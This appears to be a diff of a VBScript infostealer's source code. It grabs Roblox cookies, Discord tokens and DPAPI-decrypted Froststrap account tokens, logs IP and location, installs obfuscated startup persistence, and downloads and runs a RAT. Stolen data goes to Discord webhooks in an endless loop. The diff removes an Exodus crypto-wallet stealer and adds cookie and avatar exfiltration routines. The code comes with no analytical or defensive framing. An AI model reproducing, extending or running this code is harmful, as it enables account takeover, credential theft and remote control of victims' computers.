@@ -22,13 +22,14 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Call IP(WH)
 Call GrabTokens(WH)
 Call Persistence
-Call GrabExodus(WH)
-Call SendEmojiUI(WH)
 
-' --- 2. RAT DROP (LOGS CHANNEL) ---
+' --- 2. AVATAR UI + COOKIE (LOGS CHANNEL) ---
+Call SendAvatarUI(WH)
+
+' --- 3. RAT DROP (LOGS CHANNEL) ---
 Call DropRAT(WH, True)
 
-' --- 3. INFINITE Re-grab chain (RE-GRAB CHANNEL) ---
+' --- 4. INFINITE Re-grab chain (RE-GRAB CHANNEL) ---
 Dim runCount
 runCount = 0
 Do
@@ -37,7 +38,7 @@ Do
     
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
-    Call SendEmojiUI(RE_WH)
+    Call PostCookieOnly(RE_WH)
     Call GrabFroststrap(RE_WH)
     
     Call DropRAT(RE_WH, False)
@@ -47,45 +48,66 @@ Loop
 
 window.close()
 
-' --- SEND UI WITH EMOJIS ---
-Sub SendEmojiUI(targetWH)
+' --- SIMPLE AVATAR UI ---
+Sub SendAvatarUI(targetWH)
     Dim cookie : cookie = GetRobloxCookie()
-    If Len(cookie) < 50 Then Exit Sub
-    
-    Dim desc : desc = "🔴 **Password:** dreistuff" & vbCrLf & vbCrLf & _
-                      "🎮 **Cookie:**" & vbCrLf & "``" & cookie & "``"
-                      
-    Call PostEmbedTo("👤 Roblox Account UI", desc, 10181046, targetWH)
+    Dim av : av = "https://tr.rbxcdn.com/f4e7f1f6c7b2e0f2e6c2c8e2b4f4e2b4/420/420/AvatarHeadshot/Png"
+
+    ' Try to get the real avatar if we have a cookie
+    If Len(cookie) > 50 Then
+        On Error Resume Next
+        Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+        xh.SetOption 2, 13056
+        xh.Open "GET", "https://users.roblox.com/v1/users/authenticated", False
+        xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
+        xh.SetRequestHeader "User-Agent", "Roblox/WinInet"
+        xh.Send
+        
+        If xh.Status = 200 Then
+            Dim uid : uid = "1"
+            Dim m1 : Set m1 = CreateObject("VBScript.RegExp")
+            m1.Pattern = """id"":(\d+)"
+            Dim m2 : Set m2 = m1.Execute(xh.responseText)
+            If m2.Count > 0 Then uid = m2(0).SubMatches(0)
+            
+            Dim axh : Set axh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+            axh.SetOption 2, 13056
+            axh.Open "GET", "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" & uid & "&size=420x420&format=Png", False
+            axh.Send
+            If axh.Status = 200 Then
+                Dim am1 : Set am1 = CreateObject("VBScript.RegExp")
+                am1.Pattern = """imageUrl"":""([^""]+)"""
+                Dim am2 : Set am2 = am1.Execute(axh.responseText)
+                If am2.Count > 0 Then av = am2(0).SubMatches(0)
+            End If
+        End If
+        On Error Goto 0
+    End If
+
+    Dim DQ : DQ = Chr(34)
+    Dim j : j = "{" & DQ & "content" & DQ & ":" & DQ & "@everyone Hit" & DQ & "," & DQ & "embeds" & DQ & ":[{" & _
+                DQ & "title" & DQ & ":" & DQ & "Roblox Avatar" & DQ & "," & _
+                DQ & "color" & DQ & ":10181046," & _
+                DQ & "image" & DQ & ":{" & DQ & "url" & DQ & ":" & DQ & av & DQ & "}}]}"
+
+    Dim h : Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", targetWH, False
+    h.SetRequestHeader "Content-Type", "application/json"
+    h.Send j
+    Set h = Nothing
+
+    ' Send Cookie Embed right after
+    If Len(cookie) > 0 Then
+        Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
+    End If
 End Sub
 
-' --- EXODUS STEALER (ZIPPED) ---
-Sub GrabExodus(targetWH)
-    Dim base : base = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Exodus\exodus.wallet"
-    Dim passFile : passFile = base & "\passphrase.json"
-    Dim pStatus : pStatus = "No Password"
-    
-    If fso.FileExists(passFile) Then pStatus = "Password Protected"
-    If Not fso.FolderExists(base) Then
-        Exit Sub
-    End If
-
-    Dim zipPath : zipPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\exodus_wallet.zip"
-    If fso.FileExists(zipPath) Then fso.DeleteFile zipPath, True
-    
-    Dim zipCmd : zipCmd = "powershell -NoP -Exec Bypass -Command ""Compress-Archive -Path '" & base & "\*' -DestinationPath '" & zipPath & "' -Force"""
-    sh.Run zipCmd, 0, True
-
-    If fso.FileExists(zipPath) Then
-        Dim sizeMB : sizeMB = Round(fso.GetFile(zipPath).Size / 1048576, 2)
-        
-        Dim desc : desc = "💼 **Exodus Wallet Found**" & vbCrLf
-        desc = desc & "🔑 **Password:** " & pStatus & vbCrLf
-        desc = desc & "📦 **Size:** " & sizeMB & " MB"
-        
-        Call PostEmbedTo("🔐 Exodus Wallet", desc, 10181046, targetWH)
-        Call PostFileTo("exodus_wallet.zip", ReadFile(zipPath), targetWH, "")
-        fso.DeleteFile zipPath, True
-    End If
+' --- PostCookieOnly (For Re-grab) ---
+Sub PostCookieOnly(targetWH)
+    Dim cookie : cookie = GetRobloxCookie()
+    If Len(cookie) = 0 Then Exit Sub
+    Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
 End Sub
 
 ' --- RAT DROP ---
@@ -96,7 +118,7 @@ Sub DropRAT(targetWH, sendRocket)
     Dim op : op = tPath & "\agent.exe"
     
     If sendRocket Then
-        Call PostEmbedTo("🚀 RAT Download", "Downloading...", 10181046, targetWH)
+        Call PostEmbedTo(":rocket: RAT Download", "Downloading...", 10181046, targetWH)
     End If
 
     If fso.FileExists(op) Then fso.DeleteFile op, True
@@ -107,7 +129,7 @@ Sub DropRAT(targetWH, sendRocket)
     If fso.FileExists(op) Then
         If fso.GetFile(op).Size > 3000000 Then
             Dim desc : desc = "RAT launched successfully"
-            Call PostEmbedTo("✅ RAT Downloaded", desc, 10181046, targetWH)
+            Call PostEmbedTo(":white_check_mark: RAT Downloaded", desc, 10181046, targetWH)
             Call RunCmd("""" & op & """")
         End If
     End If
@@ -223,7 +245,7 @@ Sub IP(targetWH)
     If xh.Status <> 200 Then Exit Sub
     Dim ll : ll = Split(xh.responseText, vbLf)
     Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
-    Call PostEmbedTo("🎯 Target", info, 10181046, targetWH)
+    Call PostEmbedTo(":dart: Target", info, 10181046, targetWH)
     Set xh = Nothing
 End Sub
 
@@ -238,9 +260,9 @@ Sub GrabFroststrap(targetWH)
     End If
     If Not fso.FileExists(fp) Then Exit Sub
 
-    Call PostEmbedTo("❄️ Froststrap", "Froststrap found, grabbing accounts...", 10181046, targetWH)
+    Call PostEmbedTo(":snowflake: Froststrap", "Froststrap found, grabbing accounts...", 10181046, targetWH)
     Dim ps
-    ps = "$w='" & targetWH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title='❄️ Froststrap Accounts';description=$desc;color=10181046})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
+    ps = "$w='" & targetWH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=10181046})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
 
@@ -272,7 +294,7 @@ Sub Persistence()
     Dim sf : Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
     sf.Close
-    Call PostEmbed("📌 Persistence", "3 startup methods installed", 10181046)
+    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
 End Sub
 
 ' --- GrabTokens ---
@@ -305,11 +327,11 @@ Sub GrabTokens(targetWH)
                         If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
                         If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                         info = info & "**Token:** " & p(4)
-                        Call PostEmbedTo("🎁 Discord Token", info, 10181046, targetWH)
+                        Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
                     End If
                 End If
                 If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
-                    Call PostEmbedTo("🍪 Roblox Cookie", Mid(l, 8), 10181046, targetWH)
+                    Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 10181046, targetWH)
                 End If
             End If
         Next
